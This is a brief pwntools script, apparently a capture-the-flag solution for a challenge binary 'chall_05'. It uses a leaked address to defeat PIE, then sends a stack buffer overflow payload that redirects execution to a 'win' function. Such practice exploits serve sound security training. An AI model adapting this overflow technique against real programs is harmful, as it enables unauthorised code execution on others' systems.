# coding: utf-8
from pwn import *
elf = ELF("./chall_05")
pr = process("./chall_05")
pr.recvuntil(":")
ovr_flw = pr.recv()
elf.address = (int(ovr_flw,16)) - elf.sym.main
payload = (b'A'*(0x60-8) + p64(elf.sym.win))
pr.sendline(payload)
pr.interactive()
pr.close()
